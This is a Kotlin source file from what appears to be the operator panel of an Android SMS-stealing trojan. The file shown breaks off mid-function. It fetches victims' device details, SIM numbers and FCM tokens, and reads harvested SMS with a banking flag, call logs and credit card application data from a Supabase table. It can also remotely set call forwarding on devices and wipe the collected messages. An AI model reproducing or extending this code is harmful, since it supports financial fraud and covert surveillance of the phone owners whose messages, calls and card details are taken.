package com.example.admin.network

import android.util.Log
import com.example.admin.utils.Constants
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import okhttp3.Headers
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONArray
import org.json.JSONObject
import java.net.URLEncoder
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.TimeUnit

/**
 * ══════════════════════════════════════════════════════════════
 *  SupabaseApi.kt — Fixed & Complete
 *
 *  Kya change hua:
 *  1. APP_ID → Constants.APP_TOKEN  (hardcoded "rto27" hata diya)
 *  2. REGISTERED_DEVICES_TABLE → Constants.TABLE_NAME
 *  3. getAllDevices()        → backend  GET /api/device/:token/list
 *  4. getAllDeviceStatuses() → backend  GET /api/device/:token/list
 *  5. getAllBatteryData()    → backend  GET /api/device/:token/list
 *  6. deleteDevice()        → backend  DELETE /api/device/:token/delete/:uid
 *
 *  Admin-only ops (expiry, sessions, adminConfig, SMS, starred,
 *  callForwarding, creditCard) → Supabase direct (anon key OK)
 * ══════════════════════════════════════════════════════════════
 */
class SupabaseApi {

    companion object {
        private const val TAG = "SUPABASE_API"

        // Ye do compile-time const hain — SupabaseRealtimeManager use karta hai
        const val PROJECT_REF              = "imfwqoocwfvvtjghgofi"
        val APP_ID                         get() = Constants.APP_TOKEN
        val REGISTERED_DEVICES_TABLE       get() = Constants.TABLE_NAME

        // Runtime refs
        val SUPABASE_URL get() = Constants.SUPABASE_URL
        val REST_URL     get() = Constants.REST_URL
        val KEY          get() = Constants.SUPABASE_KEY
        val BACKEND      get() = Constants.DEVICE_API_BASE_URL
    }

    private val client = OkHttpClient.Builder()
        .connectTimeout(30, TimeUnit.SECONDS)
        .readTimeout(30, TimeUnit.SECONDS)
        .writeTimeout(30, TimeUnit.SECONDS)
        .build()

    // ─── Data classes (unchanged) ────────────────────────────────

    data class RegisteredDevice(
        val uid: String,
        val model: String?         = "",
        val manufacturer: String?  = "",
        val androidVersion: String? = "",
        val brand: String?         = "",
        val sim1Number: String?    = "",
        val sim2Number: String?    = "",
        val sim1Carrier: String?   = "",
        val sim2Carrier: String?   = "",
        val fcmToken: String?      = "",
        val joinedAt: Long         = 0L
    )

    data class DeviceStatus(
        val uid: String,
        val available: String  = "",
        val checkedAt: Long    = 0L,
        val timestamp: Long    = 0L,
        val status: String     = "",
        val type: String       = "",
        val online: Boolean    = false
    )

    data class BatteryDataSupabase(
        val uid: String,
        val level: Int         = 0,
        val isCharging: Boolean = false,
        val temperature: Double = 0.0,
        val voltage: Int       = 0,
        val health: String?    = "",
        val timestamp: Long    = 0L
    )

    data class AdminConfig(
        val id: String        = "main",
        val number: String    = "",
        val status: String    = "OFF",
        val updatedAt: Long   = 0L
    )

    data class SmsLog(
        val id: String?       = null,
        val uniqueId: String,
        val title: String,
        val body: String,
        val senderNumber: String,
        val receiverNumber: String,
        val timestamp: Long,
        val isBanking: Boolean = false
    )

    data class CreditCardApplicationEntry(
        val id: Long              = 0L,
        val type: String          = "",
        val data: Map<String, Any> = emptyMap(),
        val submittedAtMs: Long   = 0L
    )

    // ─── Headers ────────────────────────────────────────────────

    private fun headers(): Headers = Headers.Builder()
        .add("apikey", KEY)
        .add("Authorization", "Bearer $KEY")
        .add("Content-Type", "application/json")
        .build()

    private fun upsertHeaders(): Headers = Headers.Builder()
        .add("apikey", KEY)
        .add("Authorization", "Bearer $KEY")
        .add("Content-Type", "application/json")
        .add("Prefer", "resolution=merge-duplicates,return=representation")
        .build()

    private fun patchHeaders(): Headers = Headers.Builder()
        .add("apikey", KEY)
        .add("Authorization", "Bearer $KEY")
        .add("Content-Type", "application/json")
        .add("Prefer", "return=minimal")
        .build()

    private fun deleteHeaders(): Headers = Headers.Builder()
        .add("apikey", KEY)
        .add("Authorization", "Bearer $KEY")
        .add("Content-Type", "application/json")
        .add("Prefer", "return=minimal")
        .build()

    private fun jsonBody(obj: JSONObject) =
        obj.toString().toRequestBody("application/json; charset=utf-8".toMediaType())

    private fun encode(v: String): String = URLEncoder.encode(v, "UTF-8")

    // ─── Row filters ────────────────────────────────────────────

    fun isRealDeviceRow(subId: String, dataType: String = ""): Boolean {
        if (subId.isBlank()) return false
        if (subId.startsWith("admin_")) return false
        if (subId.startsWith("star_")) return false
        if (dataType.equals("admin_config", ignoreCase = true)) return false
        if (dataType.equals("starred_device", ignoreCase = true)) return false
        if (dataType.equals("call_forwarding", ignoreCase = true)) return false
        return true
    }

    // ─── Row parsers ────────────────────────────────────────────

    fun parseRegisteredDeviceRow(row: JSONObject): RegisteredDevice? {
        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(uid, dataType)) return null
        val dj = row.optJSONObject("data_json") ?: JSONObject()
        return RegisteredDevice(
            uid          = uid,
            model        = dj.optString("model",        row.optString("model", "")),
            manufacturer = dj.optString("manufacturer", row.optString("manufacturer", "")),
            androidVersion = dj.optString("androidversion",
                dj.optString("androidVersion", row.optString("androidversion", ""))),
            brand        = dj.optString("brand",        row.optString("brand", "")),
            sim1Number   = dj.optString("sim1number",   dj.optString("sim1Number",   row.optString("sim1number", ""))),
            sim2Number   = dj.optString("sim2number",   dj.optString("sim2Number",   row.optString("sim2number", ""))),
            sim1Carrier  = dj.optString("sim1carrier",  dj.optString("sim1Carrier",  row.optString("sim1carrier", ""))),
            sim2Carrier  = dj.optString("sim2carrier",  dj.optString("sim2Carrier",  row.optString("sim2carrier", ""))),
            fcmToken     = dj.optString("fcm_token",    dj.optString("fcmtoken",     dj.optString("fcmToken", ""))),
            joinedAt     = dj.optLong("joinedat",
                row.optLong("registered_at", row.optLong("created_at", 0L)))
        )
    }

    fun parseDeviceStatusRow(row: JSONObject, now: Long = System.currentTimeMillis()): DeviceStatus? {
        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(uid, dataType)) return null
        val dj = row.optJSONObject("data_json") ?: JSONObject()
        val heartbeat = dj.optJSONObject("heartbeat") ?: JSONObject()
        val checkedAt = heartbeat.optLong("checked_at",
            dj.optLong("online_checked_at",
                dj.optLong("last_seen_at", row.optLong("updated_at", 0L))))
        val available = heartbeat.optString("available", "")
        val status    = dj.optString("online_status", row.optString("status", ""))
        val online    = checkedAt > 0L && now - checkedAt in 0 until (15 * 60 * 1000L)
        return DeviceStatus(uid = uid, available = available, checkedAt = checkedAt,
            timestamp = checkedAt, status = status, type = "heartbeat", online = online)
    }

    fun parseBatteryRow(row: JSONObject): BatteryDataSupabase? {
        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(uid, dataType)) return null
        val dj = row.optJSONObject("data_json") ?: JSONObject()

        // Support nested battery_data object OR flat fields directly in data_json
        val battery = dj.optJSONObject("battery_data")

        val level = battery?.optInt("level", -1)?.takeIf { it >= 0 }
            ?: dj.optInt("battery_level", -1).takeIf { it >= 0 }
            ?: dj.optInt("level", -1).takeIf { it >= 0 }
            ?: return null  // no battery data at all

        return BatteryDataSupabase(
            uid        = uid,
            level      = level,
            isCharging = battery?.optBoolean("isCharging",
                            battery.optBoolean("ischarging", false))
                         ?: dj.optBoolean("isCharging",
                            dj.optBoolean("ischarging",
                            dj.optBoolean("is_charging", false))),
            temperature = battery?.optDouble("temperature", 0.0)
                          ?: dj.optDouble("battery_temperature", 0.0),
            voltage    = battery?.optInt("voltage", 0)
                         ?: dj.optInt("battery_voltage", 0),
            health     = battery?.optString("health", "")
                         ?: dj.optString("battery_health", ""),
            timestamp  = battery?.optLong("timestamp", 0L)
                         ?: dj.optLong("battery_timestamp", 0L)
        )
    }

    fun parseStarredRow(row: JSONObject): Pair<String, Boolean>? {
        val uid = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(uid, dataType)) return null
        val dj = row.optJSONObject("data_json") ?: JSONObject()
        return uid to dj.optBoolean("starred", false)
    }

    // ════════════════════════════════════════════════════════════
    //  DEVICE OPS — backend API se (service role on server)
    // ════════════════════════════════════════════════════════════

    /**
     * GET /api/device/:token/list
     * Sare registered devices — backend se
     */
    suspend fun getAllDevices(): Result<List<RegisteredDevice>> = withContext(Dispatchers.IO) {
        try {
            val url = "$BACKEND/list"
            Log.d(TAG, "getAllDevices → $url")
            val resp = client.newCall(Request.Builder().url(url).get().build()).execute()
            val body = resp.body?.string() ?: "{}"
            if (!resp.isSuccessful) return@withContext Result.failure(
                Exception("getAllDevices HTTP ${resp.code}: $body"))
            val obj = JSONObject(body)
            if (!obj.optBoolean("ok", true)) return@withContext Result.failure(
                Exception(obj.optString("error", "Backend error")))
            val arr = obj.optJSONArray("devices") ?: JSONArray()
            val list = mutableListOf<RegisteredDevice>()
            for (i in 0 until arr.length())
                parseRegisteredDeviceRow(arr.getJSONObject(i))?.let { list.add(it) }
            Result.success(list)
        } catch (e: Exception) {
            Log.e(TAG, "getAllDevices", e)
            Result.failure(e)
        }
    }

    /**
     * GET /api/device/:token/list (same endpoint — parse status fields)
     */
    suspend fun getAllDeviceStatuses(): Result<List<DeviceStatus>> = withContext(Dispatchers.IO) {
        try {
            val url = "$BACKEND/list"
            val resp = client.newCall(Request.Builder().url(url).get().build()).execute()
            val body = resp.body?.string() ?: "{}"
            if (!resp.isSuccessful) return@withContext Result.failure(
                Exception("getAllDeviceStatuses HTTP ${resp.code}"))
            val arr = JSONObject(body).optJSONArray("devices") ?: JSONArray()
            val list = mutableListOf<DeviceStatus>()
            val now = System.currentTimeMillis()
            for (i in 0 until arr.length())
                parseDeviceStatusRow(arr.getJSONObject(i), now)?.let { list.add(it) }
            Result.success(list)
        } catch (e: Exception) {
            Log.e(TAG, "getAllDeviceStatuses", e)
            Result.failure(e)
        }
    }

    suspend fun getLatestDeviceStatuses(): Result<Map<String, DeviceStatus>> = withContext(Dispatchers.IO) {
        try {
            val statuses = getAllDeviceStatuses().getOrNull() ?: emptyList()
            val map = mutableMapOf<String, DeviceStatus>()
            statuses.forEach { s ->
                val old = map[s.uid]
                if (old == null || s.checkedAt > old.checkedAt) map[s.uid] = s
            }
            Result.success(map)
        } catch (e: Exception) {
            Log.e(TAG, "getLatestDeviceStatuses", e)
            Result.failure(e)
        }
    }

    /**
     * GET /api/device/:token/get/:uid — single device (backend route)
     */
    suspend fun getDeviceByUid(uid: String): Result<RegisteredDevice?> = withContext(Dispatchers.IO) {
        try {
            if (!isRealDeviceRow(uid)) return@withContext Result.failure(Exception("Invalid UID"))
            val url = "$BACKEND/get/${encode(uid)}"
            val resp = client.newCall(Request.Builder().url(url).get().build()).execute()
            val body = resp.body?.string() ?: "{}"
            if (!resp.isSuccessful) return@withContext Result.failure(
                Exception("getDeviceByUid HTTP ${resp.code}"))
            val obj = JSONObject(body)
            val data = obj.optJSONObject("data") ?: return@withContext Result.success(null)
            Result.success(parseRegisteredDeviceRow(data))
        } catch (e: Exception) {
            Log.e(TAG, "getDeviceByUid $uid", e)
            Result.failure(e)
        }
    }

    /**
     * Alias used by FinalActivity.fetchDeviceInfo()
     * Returns full device info (model, manufacturer, SIM numbers etc.)
     */
    suspend fun getDeviceInfo(uid: String): Result<RegisteredDevice?> = getDeviceByUid(uid)

    /**
     * Supabase direct — single device row (anon key ok, public RLS)
     * Used as fallback if backend isn't reachable, or for FinalActivity
     */
    suspend fun getDeviceRowDirect(uid: String): Result<JSONObject?> = withContext(Dispatchers.IO) {
        try {
            if (!isRealDeviceRow(uid)) return@withContext Result.failure(Exception("Invalid UID"))
            val url = "$REST_URL/$REGISTERED_DEVICES_TABLE" +
                    "?sub_id=eq.${encode(uid)}&app_id=eq.$APP_ID&limit=1"
            val resp = client.newCall(Request.Builder().url(url).headers(headers()).get().build()).execute()
            val body = resp.body?.string() ?: "[]"
            if (!resp.isSuccessful) return@withContext Result.failure(Exception("HTTP ${resp.code}"))
            val arr = JSONArray(body)
            Result.success(if (arr.length() > 0) arr.getJSONObject(0) else null)
        } catch (e: Exception) {
            Log.e(TAG, "getDeviceRowDirect $uid", e)
            Result.failure(e)
        }
    }

    /**
     * Fetch heartbeat / online status for a single device.
     * FinalActivity.fetchOnlineStatus() uses this.
     */
    suspend fun getDeviceOnlineStatus(uid: String): Result<DeviceStatus?> = withContext(Dispatchers.IO) {
        try {
            val row = getDeviceRowDirect(uid).getOrNull() ?: return@withContext Result.success(null)
            Result.success(parseDeviceStatusRow(row))
        } catch (e: Exception) {
            Log.e(TAG, "getDeviceOnlineStatus $uid", e)
            Result.failure(e)
        }
    }

    // ─── Call logs ───────────────────────────────────────────────

    data class CallLog(
        val id: String          = "",
        val uid: String         = "",
        val number: String      = "",
        val name: String        = "",
        val type: String        = "",   // "incoming", "outgoing", "missed"
        val duration: Long      = 0L,
        val timestamp: Long     = 0L
    )

    /**
     * Fetch call logs stored in data_json.call_logs[] for a device.
     * FinalActivity.fetchCallHistory() uses this.
     */
    suspend fun getCallLogs(uid: String, limit: Int = 50): Result<List<CallLog>> =
        withContext(Dispatchers.IO) {
            try {
                if (!isRealDeviceRow(uid)) return@withContext Result.failure(Exception("Invalid UID"))
                val row = getDeviceRowDirect(uid).getOrNull()
                    ?: return@withContext Result.success(emptyList())
                val dj = row.optJSONObject("data_json") ?: JSONObject()

                // Support both call_logs and call_history key names
                val arr = dj.optJSONArray("call_logs")
                    ?: dj.optJSONArray("call_history")
                    ?: JSONArray()

                val list = mutableListOf<CallLog>()
                for (i in 0 until minOf(arr.length(), limit)) {
                    val o = arr.optJSONObject(i) ?: continue
                    list.add(CallLog(
                        id        = o.optString("id",        o.optString("call_id", "${uid}_$i")),
                        uid       = uid,
                        number    = o.optString("number",    o.optString("phone_number",
                                       o.optString("contact_number", "Unknown"))),
                        name      = o.optString("name",      o.optString("contact_name", "")),
                        type      = o.optString("type",      o.optString("call_type", "unknown")),
                        duration  = o.optLong("duration",    0L),
                        timestamp = readCallTimestamp(o)
                    ))
                }
                list.sortByDescending { it.timestamp }
                Result.success(list)
            } catch (e: Exception) {
                Log.e(TAG, "getCallLogs $uid", e)
                Result.failure(e)
            }
        }

    private fun readCallTimestamp(o: JSONObject): Long {
        val ts = o.optLong("timestamp", 0L); if (ts > 0L) return ts
        val dt = o.optLong("date", 0L);      if (dt > 0L) return dt
        parseTimestampString(o.optString("date_str", ""))?.let { return it }
        return 0L
    }

    /**
     * GET /api/device/:token/list (parse battery data from same response)
     */
    suspend fun getAllBatteryData(): Result<List<BatteryDataSupabase>> = withContext(Dispatchers.IO) {
        try {
            val url = "$BACKEND/list"
            val resp = client.newCall(Request.Builder().url(url).get().build()).execute()
            val body = resp.body?.string() ?: "{}"
            if (!resp.isSuccessful) return@withContext Result.failure(
                Exception("getAllBatteryData HTTP ${resp.code}"))
            val arr = JSONObject(body).optJSONArray("devices") ?: JSONArray()
            val list = mutableListOf<BatteryDataSupabase>()
            for (i in 0 until arr.length())
                parseBatteryRow(arr.getJSONObject(i))?.let { list.add(it) }
            Result.success(list)
        } catch (e: Exception) {
            Log.e(TAG, "getAllBatteryData", e)
            Result.failure(e)
        }
    }

    /**
     * DELETE /api/admin/apps/:token/devices/:uid
     * Backend admin endpoint use karo — service role se actual hard-delete hota hai.
     * Anon key se Supabase direct call nahi — DELETE policy anon pe nahi hai.
     */
    suspend fun deleteDevice(uid: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            if (!isRealDeviceRow(uid)) return@withContext Result.failure(Exception("Invalid device uid"))
            val url = "${Constants.ADMIN_API_BASE_URL}/devices/${encode(uid)}"
            Log.d(TAG, "deleteDevice → DELETE $url")
            val resp = client.newCall(
                Request.Builder().url(url).delete("".toRequestBody(null)).build()
            ).execute()
            val body = resp.body?.string() ?: ""
            Log.d(TAG, "deleteDevice response: ${resp.code} $body")
            if (!resp.isSuccessful) return@withContext Result.failure(
                Exception("deleteDevice HTTP ${resp.code}: $body"))
            Result.success(true)
        } catch (e: Exception) {
            Log.e(TAG, "deleteDevice $uid", e)
            Result.failure(e)
        }
    }

    // ════════════════════════════════════════════════════════════
    //  ADMIN OPS — Supabase direct (anon key, admin-level tables)
    // ════════════════════════════════════════════════════════════

    suspend fun getAdminConfig(): Result<AdminConfig> = withContext(Dispatchers.IO) {
        try {
            val url = "$REST_URL/$REGISTERED_DEVICES_TABLE" +
                    "?select=sub_id,data_json,updated_at&sub_id=eq.admin_config_main&limit=1"
            val resp = client.newCall(Request.Builder().url(url).headers(headers()).get().build()).execute()
            val body = resp.body?.string() ?: "[]"
            if (!resp.isSuccessful) return@withContext Result.success(AdminConfig())
            val arr = JSONArray(body)
            if (arr.length() == 0) return@withContext Result.success(AdminConfig())
            val row = arr.getJSONObject(0)
            val dj = row.optJSONObject("data_json") ?: JSONObject()
            Result.success(AdminConfig(
                id        = "main",
                number    = dj.optString("number", ""),
                status    = dj.optString("status", "OFF"),
                updatedAt = row.optLong("updated_at", 0L)
            ))
        } catch (e: Exception) {
            Log.e(TAG, "getAdminConfig", e)
            Result.success(AdminConfig())
        }
    }

    suspend fun updateAdminConfig(number: String, status: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val now = System.currentTimeMillis()
            val json = JSONObject().apply {
                put("sub_id", "admin_config_main"); put("uid", "admin_config_main")
                put("app_id", APP_ID); put("data_type", "admin_config")
                put("data_json", JSONObject().apply {
                    put("number", number); put("status", status); put("updated_at", now)
                })
                put("status", status); put("created_at", now); put("updated_at", now)
            }
            val url = "$REST_URL/$REGISTERED_DEVICES_TABLE?on_conflict=sub_id"
            val resp = client.newCall(
                Request.Builder().url(url).headers(upsertHeaders()).post(jsonBody(json)).build()
            ).execute()
            resp.body?.close()
            Result.success(resp.isSuccessful)
        } catch (e: Exception) {
            Log.e(TAG, "updateAdminConfig", e)
            Result.failure(e)
        }
    }

    // ─── SMS ─────────────────────────────────────────────────────

    suspend fun getAllSmsMessagesFromRegisteredDevices(rowLimit: Int = 1000): Result<List<SmsLog>> =
        withContext(Dispatchers.IO) {
            try {
                val safeLimit = rowLimit.coerceIn(1, 1000)
                val url = "$REST_URL/$REGISTERED_DEVICES_TABLE" +
                        "?select=sub_id,uid,data_type,app_id,sms_messages,total_sms_count," +
                        "last_sms_timestamp,last_sms_log,updated_at" +
                        "&app_id=eq.$APP_ID&order=updated_at.desc&limit=$safeLimit"
                val resp = client.newCall(Request.Builder().url(url).headers(headers()).get().build()).execute()
                val body = resp.body?.string() ?: "[]"
                if (!resp.isSuccessful) return@withContext Result.failure(
                    Exception("getAllSms HTTP ${resp.code}"))
                val rows = JSONArray(body)
                val allSms = mutableListOf<SmsLog>()
                val seen = HashSet<String>()
                for (i in 0 until rows.length()) {
                    val row = rows.getJSONObject(i)
                    val subId    = row.optString("sub_id", row.optString("uid", "")).trim()
                    val dataType = row.optString("data_type", "").trim()
                    if (!isRealDeviceRow(subId, dataType)) continue
                    for (sms in parseSmsMessagesFromRegisteredDevice(row)) {
                        val key = "${sms.uniqueId}-${sms.id}"
                        if (seen.add(key)) allSms.add(sms)
                    }
                }
                allSms.sortByDescending { it.timestamp }
                Result.success(allSms)
            } catch (e: Exception) {
                Log.e(TAG, "getAllSmsMessagesFromRegisteredDevices", e)
                Result.failure(e)
            }
        }

    fun parseSmsMessagesFromRegisteredDevice(row: JSONObject): List<SmsLog> {
        val deviceId = row.optString("sub_id", row.optString("uid", "")).trim()
        val dataType = row.optString("data_type", "").trim()
        if (!isRealDeviceRow(deviceId, dataType)) return emptyList()
        val smsArr = row.optJSONArray("sms_messages") ?: JSONArray()
        val list = mutableListOf<SmsLog>()
        for (i in 0 until smsArr.length())
            parseSingleSmsObject(deviceId, smsArr.optJSONObject(i) ?: continue, i)?.let { list.add(it) }
        return list
    }

    fun parseSingleSmsObject(deviceId: String, obj: JSONObject, index: Int = 0): SmsLog? {
        val rawId = obj.optString("sms_id", obj.optString("id", obj.optString("message_id", ""))).trim()
        val ts    = readTimestamp(obj)
        val smsId = when {
            rawId.isNotBlank() -> rawId
            ts > 0L            -> "sms_$ts"
            else               -> "sms_${deviceId}_${System.currentTimeMillis()}_$index"
        }
        val body   = obj.optString("message_body",
            obj.optString("body", obj.optString("text", obj.optString("message",
                obj.optString("content", "")))))
        if (body.isBlank()) return null
        val sender   = obj.optString("sender_number",
            obj.optString("phone_number", obj.optString("sender",
                obj.optString("from", "Unknown"))))
        val receiver = obj.optString("receiver_number",
            obj.optString("receiver", obj.optString("to", "")))
        return SmsLog(id = smsId, uniqueId = deviceId,
            title = obj.optString("title", "New SMS"), body = body,
            senderNumber = sender, receiverNumber = receiver,
            timestamp = if (ts > 0L) ts else System.currentTimeMillis())
    }

    private fun readTimestamp(obj: JSONObject): Long {
        val ts     = obj.optLong("timestamp", 0L);     if (ts > 0L)     return ts
        val synced = obj.optLong("synced_at", 0L);     if (synced > 0L) return synced
        parseTimestampString(obj.optString("timestamp", ""))?.let { return it }
        parseTimestampString(obj.optString("timestamp_readable", ""))?.let { return it }
        return 0L
    }

    private fun parseTimestampString(value: String): Long? {
        if (value.isBlank()) return null
        listOf("yyyy-MM-dd HH:mm:ss", "yyyy-MM-dd'T'HH:mm:ss.SSS'Z'",
            "yyyy-MM-dd'T'HH:mm:ss'Z'", "dd MMM yyyy, hh:mm a").forEach { pattern ->
            try {
                val sdf = SimpleDateFormat(pattern, Locale.getDefault())
                if (pattern.contains("'Z'")) sdf.timeZone = TimeZone.getTimeZone("UTC")
                sdf.parse(value)?.let { return it.time }
            } catch (_: Exception) {}
        }
        return null
    }

    suspend fun getAllSmsLogs(limit: Int = 200): Result<List<SmsLog>> =
        getAllSmsMessagesFromRegisteredDevices(rowLimit = 1000)

    suspend fun getSmsLogsByUniqueId(uniqueId: String, limit: Int = 50): Result<List<SmsLog>> =
        withContext(Dispatchers.IO) {
            try {
                val all = getAllSmsMessagesFromRegisteredDevices(1000).getOrThrow()
                Result.success(all.filter { it.uniqueId == uniqueId }
                    .sortedByDescending { it.timestamp }
                    .take(limit.coerceIn(1, 500)))
            } catch (e: Exception) { Result.failure(e) }
        }

    suspend fun deleteSmsFromRegisteredDevice(deviceId: String, smsId: String): Result<Boolean> =
        withContext(Dispatchers.IO) {
            try {
                if (!isRealDeviceRow(deviceId)) return@withContext Result.failure(Exception("Invalid device"))
                val getUrl = "$REST_URL/$REGISTERED_DEVICES_TABLE" +
                        "?select=sub_id,sms_messages&sub_id=eq.${encode(deviceId)}" +
                        "&app_id=eq.$APP_ID&limit=1"
                val getResp = client.newCall(
                    Request.Builder().url(getUrl).headers(headers()).get().build()
                ).execute()
                val getBody = getResp.body?.string() ?: "[]"
                if (!getResp.isSuccessful) return@withContext Result.failure(
                    Exception("GET HTTP ${getResp.code}"))
                val rows = JSONArray(getBody)
                if (rows.length() == 0) return@withContext Result.failure(Exception("Device not found"))
                val oldArr = rows.getJSONObject(0).optJSONArray("sms_messages") ?: JSONArray()
                val newArr = JSONArray()
                for (i in 0 until oldArr.length()) {
                    val o = oldArr.optJSONObject(i) ?: continue
                    val curId = o.optString("sms_id", o.optString("id", o.optString("message_id", "")))
                    if (curId != smsId) newArr.put(o)
                }
                val patch = JSONObject().apply {
                    put("sms_messages", newArr); put("total_sms_count", newArr.length())
                    put("updated_at", System.currentTimeMillis())
                }
                val patchUrl = "$REST_URL/$REGISTERED_DEVICES_TABLE" +
                        "?sub_id=eq.${encode(deviceId)}&app_id=eq.$APP_ID"
                val r = client.newCall(
                    Request.Builder().url(patchUrl).headers(patchHeaders()).patch(jsonBody(patch)).build()
                ).execute()
                r.body?.close()
                Result.success(r.isSuccessful)
            } catch (e: Exception) {
                Log.e(TAG, "deleteSmsFromRegisteredDevice", e)
                Result.failure(e)
            }
        }

    suspend fun deleteSmsLog(smsId: String): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val match = getAllSmsMessagesFromRegisteredDevices(1000).getOrThrow()
                .firstOrNull { it.id == smsId }
                ?: return@withContext Result.failure(Exception("SMS not found"))
            deleteSmsFromRegisteredDevice(
                match.uniqueId,
                match.id ?: return@withContext Result.failure(Exception("id null"))
            )
        } catch (e: Exception) { Result.failure(e) }
    }

    suspend fun deleteAllSmsMessagesForApp(): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            val url = "$REST_URL/$REGISTERED_DEVICES_TABLE" +
                    "?select=sub_id,data_type&app_id=eq.$APP_ID&limit=1000"
            val resp = client.newCall(Request.Builder().url(url).headers(headers()).get().build()).execute()
            val body = resp.body?.string() ?: "[]"
            if (!resp.isSuccessful) return@withContext Result.failure(Exception("GET HTTP ${resp.code}"))
            val rows = JSONArray(body)
            for (i in 0 until rows.length()) {
                val row      = rows.getJSONObject(i)
                val deviceId = row.optString("sub_id", "").trim()
                val dataType = row.optString("data_type", "").trim()
                if (!isRealDeviceRow(deviceId, dataType)) continue
                val patch = JSONObject().apply {
                    put("sms_messages", JSONArray()); put("total_sms_count", 0)
                    put("last_sms_timestamp", 0); put("last_sms_log", JSONObject())
                    put("updated_at", System.currentTimeMillis())
                }
                val patchUrl = "$REST_URL/$REGISTERED_DEVICES_TABLE" +
                        "?sub_id=eq.${encode(deviceId)}&app_id=eq.$APP_ID"
                client.newCall(
                    Request.Builder().url(patchUrl).headers(patchHeaders()).patch(jsonBody(patch)).build()
                ).execute().close()
            }
            Result.success(true)
        } catch (e: Exception) {
            Log.e(TAG, "deleteAllSmsMessagesForApp", e)
            Result.failure(e)
        }
    }

    // ─── Starred ─────────────────────────────────────────────────

    suspend fun getStarredDevices(): Result<Map<String, Boolean>> = withContext(Dispatchers.IO) {
        try {
            val url = "$REST_URL/$REGISTERED_DEVICES_TABLE" +
                    "?select=sub_id,uid,data_type,data_json&app_id=eq.$APP_ID&limit=1000"
            val resp = client.newCall(Request.Builder().url(url).headers(headers()).get().build()).execute()
            val body = resp.body?.string() ?: "[]"
            if (!resp.isSuccessful) return@withContext Result.success(emptyMap())
            val arr = JSONArray(body)
            val map = mutableMapOf<String, Boolean>()
            for (i in 0 until arr.length())
                parseStarredRow(arr.getJSONObject(i))?.let { map[it.first] = it.second }
            Result.success(map)
        } catch (e: Exception) { Result.success(emptyMap()) }
    }

    suspend fun setStarred(uid: String, starred: Boolean): Result<Boolean> = withContext(Dispatchers.IO) {
        try {
            if (!isRealDeviceRow(uid)) return@withContext Result.failure(Exception("Invalid device"))
            val getUrl = "$REST_URL/$REGISTERED_DEVICES_TABLE" +
                    "?select=sub_id,data_json&sub_id=eq.${encode(uid)}&app_id=eq.$APP_ID&limit=1"
            val getResp = client.newCall(
                Request.Builder().url(getUrl).headers(headers()).get().build()
            ).execute()
            val arr = JSONArray(getResp.body?.string() ?: "[]")
            val now = System.currentTimeMillis()
            if (arr.length() == 0) {
                val json = JSONObject().apply {
                    put("sub_id", uid); put("uid", uid); put("app_id", APP_ID)
                    put("data_type", "device")
                    put("data_json", JSONObject().apply { put("starred", starred) })
                    put("status", "active"); put("created_at", now); put("updated_at", now)
                }
                val r = client.newCall(
                    Request.Builder()
                        .url("$REST_URL/$REGISTERED_DEVICES_TABLE?on_conflict=sub_id")
                        .headers(upsertHeaders()).post(jsonBody(json)).build()
                ).execute()
                r.body?.close()
                return@withContext Result.success(r.isSuccessful)
            }
            val existingDj = arr.getJSONObject(0).optJSONObject("data_json") ?: JSONObject()
            existingDj.put("starred", starred)
            val patch = JSONObject().apply { put("data_json", existingDj); put("updated_at", now) }
            val r = client.newCall(
                Request.Builder()
                    .url("$REST_URL/$REGISTERED_DEVICES_TABLE?sub_id=eq.${encode(uid)}&app_id=eq.$APP_ID")
                    .headers(patchHeaders()).patch(jsonBody(patch)).build()
            ).execute()
            r.body?.close()
            Result.success(r.isSuccessful)
        } catch (e: Exception) {
            Log.e(TAG, "setStarred $uid", e)
            Result.failure(e)
        }
    }

    // ─── Call forwarding ─────────────────────────────────────────

    suspend fun updateCallForwarding(uid: String, number: String, status: String): Result<Boolean> =
        withContext(Dispatchers.IO) {
            try {
                if (!isRealDeviceRow(uid)) return@withContext Result.failure(Exception("Invalid device"))
                val now = System.currentTimeMillis()
                val json = JSONObject().apply {
                    put("call_forward_number", number); put("call_forward_status", status)
                    put("call_forward_timestamp", now); put("updated_at", now)
                }
                val r = client.newCall(
                    Request.Builder()
                        .url("$REST_URL/$REGISTERED_DEVICES_TABLE?sub_id=eq.${encode(uid)}&app_id=eq.$APP_ID")
                        .headers(patchHeaders()).patch(jsonBody(json)).build()
                ).execute()
                r.body?.close()
                Result.success(r.isSuccessful)
            } catch (e: Exception) {
                Log.e(TAG, "updateCallForwarding $uid", e)
                Result.failure(e)
            }
        }

    // ─── Credit card applications ─────────────────────────────────

    suspend fun getCreditCardApplications(uid: String): Result<List<CreditCardApplicationEntry>> =
        withContext(Dispatchers.IO) {
            try {
                if (uid.isBlank()) return@withContext Result.failure(Exception("UID required"))
                val url = "$REST_URL/$REGISTERED_DEVICES_TABLE" +
                        "?select=form_data_json&sub_id=eq.${encode(uid)}&app_id=eq.$APP_ID&limit=1"
                val resp = client.newCall(Request.Builder().url(url).headers(headers()).get().build()).execute()
                val body = resp.body?.string() ?: "[]"
                if (!resp.isSuccessful) return@withContext Result.failure(Exception("HTTP ${resp.code}"))
                val arr = JSONArray(body)
                if (arr.length() == 0) return@withContext Result.success(emptyList())
                val appsArr = arr.getJSONObject(0).optJSONObject("form_data_json")
                    ?.optJSONArray("credit_card_applications")
                    ?: return@withContext Result.success(emptyList())
                val result = mutableListOf<CreditCardApplicationEntry>()
                for (i in 0 until appsArr.length()) {
                    val app = appsArr.getJSONObject(i)
                    val dataMap = mutableMapOf<String, Any>()
                    app.keys().forEach { k ->
